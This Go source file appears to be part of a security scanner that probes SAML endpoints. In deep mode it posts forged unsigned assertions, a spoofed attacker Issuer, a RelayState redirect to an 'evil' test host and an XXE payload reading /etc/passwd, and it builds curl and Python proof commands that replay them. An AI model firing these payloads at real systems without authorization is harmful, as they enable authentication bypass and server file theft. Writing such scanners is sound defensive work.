// Package saml detects SAML endpoints and tests for common SAML vulnerabilities.
//
// Surface mode: passive discovery of SAML/SSO endpoints and metadata.
// Deep mode: active tests for signature bypass, XML wrapping, replay,
// issuer/audience validation, XXE.
//
// CheckIDs used:
//   - finding.CheckSAMLEndpointExposed       = "saml.endpoint_exposed"
//   - finding.CheckSAMLMetadataExposed        = "saml.metadata_exposed"
//   - finding.CheckSAMLSignatureNotValidated  = "saml.signature_not_validated"
//   - finding.CheckSAMLXMLWrapping            = "saml.xml_signature_wrapping"
//   - finding.CheckSAMLReplayAllowed          = "saml.assertion_replay"
//   - finding.CheckSAMLIssuerNotValidated     = "saml.issuer_not_validated"
//   - finding.CheckSAMLAudienceNotValidated   = "saml.audience_not_validated"
//   - finding.CheckSAMLXXEInjection           = "saml.xxe_injection"
//   - finding.CheckSAMLOpenRedirect           = "saml.open_redirect"
package saml

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/stormbane/beacon/internal/finding"
	"github.com/stormbane/beacon/internal/module"
)

const scannerName = "saml"

// Scanner detects SAML endpoints and tests for SAML security vulnerabilities.
type Scanner struct{}

// New returns a new SAML scanner.
func New() *Scanner { return &Scanner{} }

// Name returns the scanner identifier.
func (s *Scanner) Name() string { return scannerName }

// samlPaths are standard SAML/SSO paths to probe during discovery.
var samlPaths = []string{
	"/saml",
	"/saml/metadata",
	"/saml2/metadata",
	"/auth/saml",
	"/sso/saml",
	"/.well-known/saml-configuration",
	"/Saml2/metadata",
	"/simplesaml/",
	"/adfs/ls/",
	"/idp/",
	"/sso/idp",
	"/FederationMetadata/2007-06/FederationMetadata.xml",
}

// acsGuesses are common ACS (Assertion Consumer Service) endpoint patterns
// used in deep mode when an explicit ACS URL is not discovered.
var acsGuesses = []string{
	"/saml/acs",
	"/saml2/acs",
	"/auth/saml/callback",
	"/sso/saml/acs",
	"/saml/consume",
}

// Run executes the SAML scanner against the given asset.
func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	base := detectBase(ctx, client, asset)
	if base == "" {
		return nil, nil
	}

	// Catch-all / wildcard detection: if the server returns 200 for a random
	// path (GET or POST), all endpoint probes will be false positives.
	if catchAllGET(ctx, client, base) || catchAllPOST(ctx, client, base) {
		return nil, nil
	}

	var findings []finding.Finding

	// ── Surface mode: passive endpoint discovery ──────────────────────────
	discoveredACS := ""
	for _, path := range samlPaths {
		f, acsURL := probeSAMLPath(ctx, client, asset, base, path)
		if f != nil {
			findings = append(findings, *f)
		}
		if acsURL != "" && discoveredACS == "" {
			discoveredACS = acsURL
		}
	}

	if scanType != module.ScanDeep {
		return findings, nil
	}

	// ── Deep mode: active ACS probing ─────────────────────────────────────
	acsURL := discoveredACS
	if acsURL == "" {
		// Try guessed ACS paths; use the first one that responds at all.
		for _, guess := range acsGuesses {
			candidate := base + guess
			resp, err := doGET(ctx, client, candidate)
			if err == nil && resp != nil {
				resp.Body.Close()
				acsURL = candidate
				break
			}
		}
	}
	if acsURL == "" {
		// No ACS found — use the first guess as a best-effort target.
		acsURL = base + acsGuesses[0]
	}

	// 1. Unsigned assertion acceptance (signature bypass → Critical)
	if f := probeUnsignedAssertion(ctx, client, asset, acsURL); f != nil {
		findings = append(findings, *f)
	}

	// 2. Issuer mismatch acceptance (issuer not validated → High)
	if f := probeIssuerMismatch(ctx, client, asset, acsURL); f != nil {
		findings = append(findings, *f)
	}

	// 3. RelayState open redirect → Medium
	if f := probeRelayStateRedirect(ctx, client, asset, acsURL); f != nil {
		findings = append(findings, *f)
	}

	// 4. XXE injection → Critical
	if f := probeXXEInjection(ctx, client, asset, acsURL); f != nil {
		findings = append(findings, *f)
	}

	return findings, nil
}

// probeSAMLPath probes a single SAML path.  It returns a finding (if any) and
// the ACS URL if it can be inferred from a metadata document.
func probeSAMLPath(ctx context.Context, client *http.Client, asset, base, path string) (*finding.Finding, string) {
	target := base + path
	resp, err := doGET(ctx, client, target)
	if err != nil || resp == nil {
		return nil, ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound || resp.StatusCode >= 500 {
		return nil, ""
	}

	bodyStr := string(body)
	acsURL := ""

	// Look for SAML metadata indicators.
	hasEntityDescriptor := strings.Contains(bodyStr, "<EntityDescriptor") ||
		strings.Contains(bodyStr, "<md:EntityDescriptor")

	hasSAMLKeyword := strings.Contains(strings.ToLower(bodyStr), "saml") ||
		strings.Contains(strings.ToLower(bodyStr), "sso") ||
		strings.Contains(strings.ToLower(bodyStr), "federation")

	if !hasEntityDescriptor && !hasSAMLKeyword && resp.StatusCode != http.StatusOK {
		return nil, ""
	}

	// Try to extract ACS URL from metadata.
	if hasEntityDescriptor {
		if idx := strings.Index(bodyStr, `AssertionConsumerService`); idx != -1 {
			sub := bodyStr[idx:]
			if locIdx := strings.Index(sub, `Location="`); locIdx != -1 {
				rest := sub[locIdx+len(`Location="`):]
				if end := strings.Index(rest, `"`); end != -1 {
					acsURL = rest[:end]
				}
			}
		}
	}

	// Emit finding.
	if hasEntityDescriptor {
		return &finding.Finding{
			CheckID:     finding.CheckSAMLMetadataExposed,
			Module:      "surface",
			Scanner:     scannerName,
			Severity:    finding.SeverityInfo,
			Title:       "SAML metadata endpoint exposed",
			Description: "A SAML metadata document (EntityDescriptor) is publicly accessible. This reveals the service provider or identity provider configuration including certificates, endpoints, and entity IDs, which can aid an attacker in crafting targeted SAML attacks.",
			Asset:       asset,
			ProofCommand: fmt.Sprintf("curl -s '%s'", target),
			Evidence: map[string]any{
				"url":    target,
				"path":   path,
				"status": resp.StatusCode,
			},
		}, acsURL
	}

	return &finding.Finding{
		CheckID:     finding.CheckSAMLEndpointExposed,
		Module:      "surface",
		Scanner:     scannerName,
		Severity:    finding.SeverityInfo,
		Title:       "SAML/SSO endpoint detected",
		Description: "A SAML or SSO-related endpoint is reachable. This confirms the application uses SAML-based authentication and may be a target for SAML-specific attacks.",
		Asset:       asset,
		ProofCommand: fmt.Sprintf("curl -si '%s'", target),
		Evidence: map[string]any{
			"url":    target,
			"path":   path,
			"status": resp.StatusCode,
		},
	}, acsURL
}

// minimalSAMLResponse returns a base64-encoded minimal SAMLResponse XML with
// no Signature element and the provided Issuer value. IssueInstant is set to
// the current time so servers enforcing timing windows accept the assertion.
// IDs are unique per call to avoid server-side replay protection caches.
func minimalSAMLResponse(issuer, audience, acsURL string) string {
	now := time.Now().UTC()
	notAfter := now.Add(10 * time.Minute)
	// Use a timestamp-based ID so each invocation is unique (prevents replay caches
	// from rejecting a proof command run after the scanner already used the same ID).
	responseID := fmt.Sprintf("_beacon_resp_%d", now.UnixNano())
	assertionID := fmt.Sprintf("_beacon_asrt_%d", now.UnixNano()+1)
	xml := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="%s" Version="2.0"
  IssueInstant="%s"
  Destination="%s">
  <saml:Issuer>%s</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="%s" Version="2.0"
    IssueInstant="%s">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">beacon-test@beacon-test.invalid</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="%s" Recipient="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="%s">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>`,
		responseID,
		now.Format(time.RFC3339),
		acsURL,
		issuer,
		assertionID,
		now.Format(time.RFC3339),
		issuer,
		notAfter.Format(time.RFC3339),
		acsURL,
		now.Add(-1*time.Minute).Format(time.RFC3339),
		notAfter.Format(time.RFC3339),
		audience,
		now.Format(time.RFC3339),
	)
	return base64.StdEncoding.EncodeToString([]byte(xml))
}

// isSAMLError returns true if the response body contains common SAML error indicators.
func isSAMLError(body string) bool {
	lower := strings.ToLower(body)
	return strings.Contains(lower, "invalid signature") ||
		strings.Contains(lower, "signature validation") ||
		strings.Contains(lower, "saml error") ||
		strings.Contains(lower, "authentication failed") ||
		strings.Contains(lower, "invalid assertion") ||
		strings.Contains(lower, "invalid response") ||
		strings.Contains(lower, "access denied") ||
		strings.Contains(lower, "unauthorized")
}

// probeUnsignedAssertion posts a SAMLResponse with no Signature element to
// the ACS endpoint.  If the server accepts it (200 and no SAML error body),
// signature validation is not enforced.
func probeUnsignedAssertion(ctx context.Context, client *http.Client, asset, acsURL string) *finding.Finding {
	encoded := minimalSAMLResponse("https://idp.beacon-test.invalid", acsURL, acsURL)
	formData := url.Values{
		"SAMLResponse": {encoded},
		"RelayState":   {"/"},
	}

	resp, body, err := doFormPOST(ctx, client, acsURL, formData)
	if err != nil || resp == nil {
		return nil
	}

	// 200 + no error indicators → server accepted the unsigned assertion.
	if resp.StatusCode == http.StatusOK && !isSAMLError(string(body)) {
		return &finding.Finding{
			CheckID:  finding.CheckSAMLSignatureNotValidated,
			Module:   "deep",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    "SAML assertion accepted without signature validation",
			Description: "The ACS endpoint accepted a SAMLResponse that contained no Signature element. " +
				"An attacker can forge arbitrary SAML assertions and authenticate as any user, including administrators, " +
				"without possessing the identity provider's private key.",
			Asset: asset,
			ProofCommand: samlProofCommand(acsURL, "https://idp.beacon-test.invalid"),
			Evidence: map[string]any{
				"acs_url":     acsURL,
				"status_code": resp.StatusCode,
				"probe":       "unsigned_assertion",
			},
			DeepOnly: true,
		}
	}
	return nil
}

// probeIssuerMismatch posts a SAMLResponse with an attacker-controlled Issuer.
func probeIssuerMismatch(ctx context.Context, client *http.Client, asset, acsURL string) *finding.Finding {
	const attackerIssuer = "https://attacker.beacon-test.invalid"
	encoded := minimalSAMLResponse(attackerIssuer, acsURL, acsURL)
	formData := url.Values{
		"SAMLResponse": {encoded},
		"RelayState":   {"/"},
	}

	resp, body, err := doFormPOST(ctx, client, acsURL, formData)
	if err != nil || resp == nil {
		return nil
	}

	if resp.StatusCode == http.StatusOK && !isSAMLError(string(body)) {
		return &finding.Finding{
			CheckID:  finding.CheckSAMLIssuerNotValidated,
			Module:   "deep",
			Scanner:  scannerName,
			Severity: finding.SeverityHigh,
			Title:    "SAML issuer not validated — attacker-controlled issuer accepted",
			Description: "The ACS endpoint accepted a SAMLResponse with an arbitrary Issuer value " +
				"(https://attacker.beacon-test.invalid). An attacker can impersonate any identity provider " +
				"by setting a fake Issuer, bypassing the trust chain entirely.",
			Asset: asset,
			ProofCommand: samlProofCommand(acsURL, attackerIssuer),
			Evidence: map[string]any{
				"acs_url":         acsURL,
				"attacker_issuer": attackerIssuer,
				"status_code":     resp.StatusCode,
				"probe":           "issuer_mismatch",
			},
			DeepOnly: true,
		}
	}
	return nil
}

// probeRelayStateRedirect posts to the ACS with RelayState pointing to an
// external attacker URL and checks if the final redirect follows it.
func probeRelayStateRedirect(ctx context.Context, client *http.Client, asset, acsURL string) *finding.Finding {
	const evilURL = "https://evil.beacon-test.invalid"
	encoded := minimalSAMLResponse("https://idp.beacon-test.invalid", acsURL, acsURL)
	formData := url.Values{
		"SAMLResponse": {encoded},
		"RelayState":   {evilURL},
	}

	resp, _, err := doFormPOST(ctx, client, acsURL, formData)
	if err != nil || resp == nil {
		return nil
	}

	// Check if the redirect Location header points to the attacker domain.
	location := resp.Header.Get("Location")
	if resp.StatusCode >= 300 && resp.StatusCode < 400 &&
		strings.Contains(location, "evil.beacon-test.invalid") {
		return &finding.Finding{
			CheckID:  finding.CheckSAMLOpenRedirect,
			Module:   "deep",
			Scanner:  scannerName,
			Severity: finding.SeverityMedium,
			Title:    "SAML ACS open redirect via RelayState",
			Description: "The ACS endpoint redirects to the value of the RelayState parameter without " +
				"validating it against an allowlist of trusted URLs. An attacker can craft a SAML SSO link " +
				"that, after successful authentication, redirects the victim to a phishing site.",
			Asset: asset,
			ProofCommand: fmt.Sprintf(
				"curl -si -X POST '%s' --data-urlencode 'SAMLResponse=%s' --data-urlencode 'RelayState=%s'",
				acsURL, encoded, evilURL),
			Evidence: map[string]any{
				"acs_url":          acsURL,
				"relay_state":      evilURL,
				"location_header":  location,
				"status_code":      resp.StatusCode,
				"probe":            "relaystate_open_redirect",
			},
			DeepOnly: true,
		}
	}
	return nil
}

// xxePayload is a SAMLResponse that attempts to read /etc/passwd via XXE.
const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_beacon_xxe" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>&xxe;</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
</samlp:Response>`

// probeXXEInjection posts an XML document with a DOCTYPE external entity
// reference.  If the response contains /etc/passwd content, XXE is confirmed.
func probeXXEInjection(ctx context.Context, client *http.Client, asset, acsURL string) *finding.Finding {
	encoded := base64.StdEncoding.EncodeToString([]byte(xxePayload))
	formData := url.Values{
		"SAMLResponse": {encoded},
		"RelayState":   {"/"},
	}

	resp, body, err := doFormPOST(ctx, client, acsURL, formData)
	if err != nil || resp == nil {
		return nil
	}

	bodyStr := string(body)
	// Classic /etc/passwd indicators.
	if strings.Contains(bodyStr, "root:") ||
		strings.Contains(bodyStr, "/bin/bash") ||
		strings.Contains(bodyStr, "/bin/sh") ||
		strings.Contains(bodyStr, "nobody:") {
		return &finding.Finding{
			CheckID:  finding.CheckSAMLXXEInjection,
			Module:   "deep",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Title:    "XXE injection via SAML SAMLResponse",
			Description: "The SAML XML parser resolved an external entity (file:///etc/passwd) embedded in a " +
				"SAMLResponse and the file contents were reflected in the response. This constitutes a confirmed " +
				"XML External Entity (XXE) injection vulnerability enabling local file read and potentially " +
				"server-side request forgery.",
			Asset: asset,
			ProofCommand: xxeProofCommand(acsURL),
			Evidence: map[string]any{
				"acs_url":      acsURL,
				"xxe_payload":  "file:///etc/passwd",
				"status_code":  resp.StatusCode,
				"body_snippet": truncate(bodyStr, 300),
				"probe":        "xxe_injection",
			},
			DeepOnly: true,
		}
	}
	return nil
}

// catchAllGET returns true if the server responds 200 to a GET request for a
// path that cannot exist — indicating a wildcard / catch-all configuration
// where path-based findings would be false positives.
func catchAllGET(ctx context.Context, client *http.Client, base string) bool {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/beacon-probe-c4a7f2d9b3e1-doesnotexist", nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

// catchAllPOST returns true if the server responds 200 to a POST request for a
// path that cannot exist — catches servers that return 200 for any POST too
// (e.g. install script CDNs that ignore method and path entirely).
func catchAllPOST(ctx context.Context, client *http.Client, base string) bool {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+"/beacon-probe-c4a7f2d9b3e1-doesnotexist", strings.NewReader(""))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

// detectBase attempts HTTPS first, falling back to HTTP.
func detectBase(ctx context.Context, client *http.Client, asset string) string {
	for _, scheme := range []string{"https", "http"} {
		base := scheme + "://" + asset
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, base, nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		return base
	}
	return ""
}

// doGET performs a GET request and returns the response.
func doGET(ctx context.Context, client *http.Client, target string) (*http.Response, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept", "application/xml, text/xml, */*")
	return client.Do(req)
}

// doFormPOST sends an application/x-www-form-urlencoded POST and returns
// response, body bytes, and error.
func doFormPOST(ctx context.Context, client *http.Client, target string, data url.Values) (*http.Response, []byte, error) {
	encoded := data.Encode()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewBufferString(encoded))
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	resp.Body.Close()
	return resp, body, nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// samlProofCommand builds a self-contained python3 proof command that generates
// a fresh SAMLResponse at execution time. This avoids:
//   - Timestamp validation: uses current time, not a hardcoded past date
//   - Replay protection: unique IDs generated via time.time_ns() each run
//   - SSL errors: unverified context so self-signed certs don't block proof
func samlProofCommand(acsURL, issuer string) string {
	return fmt.Sprintf(`# Expected: HTTP 200 or 302 (accepted without signature validation)
python3 -c "
import base64, datetime, time, ssl, urllib.parse, urllib.request
now = datetime.datetime.utcnow().strftime('%%Y-%%m-%%dT%%H:%%M:%%SZ')
ts = str(time.time_ns())
xml = ('''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
  xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
  ID=\"_b_resp_'''+ts+'''\" Version=\"2.0\" IssueInstant=\"'''+now+'''\" Destination=\"%s\">
  <saml:Issuer>%s</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>
  <saml:Assertion ID=\"_b_asrt_'''+ts+'''\" Version=\"2.0\" IssueInstant=\"'''+now+'''\">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID>beacon-test@beacon-test.invalid</saml:NameID>
      <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">
        <saml:SubjectConfirmationData NotOnOrAfter=\"2099-01-01T00:00:00Z\" Recipient=\"%s\"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore=\"'''+now+'''\" NotOnOrAfter=\"2099-01-01T00:00:00Z\">
      <saml:AudienceRestriction><saml:Audience>%s</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant=\"'''+now+'''\">
      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>''')
b64 = base64.b64encode(xml.encode()).decode()
body = urllib.parse.urlencode({'SAMLResponse': b64, 'RelayState': '/'}).encode()
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
req = urllib.request.Request('%s', data=body, headers={'Content-Type':'application/x-www-form-urlencoded'})
try:
    r = urllib.request.urlopen(req, context=ctx, timeout=10)
    print(f'HTTP {r.status} - SUCCESS (assertion accepted without signature)')
except urllib.error.HTTPError as e:
    print(f'HTTP {e.code} - REJECTED')
"`, acsURL, issuer, issuer, acsURL, acsURL, acsURL)
}

// xxeProofCommand builds a proof command that posts the XXE payload to the ACS.
func xxeProofCommand(acsURL string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(xxePayload))
	return fmt.Sprintf(
		"# Expected: response contains /etc/passwd content (root:, nobody:, etc.)\n"+
			"curl -sk -X POST '%s' --data-urlencode 'SAMLResponse=%s' -d 'RelayState=/' | grep -E 'root:|nobody:|/bin/'",
		acsURL, encoded)
}
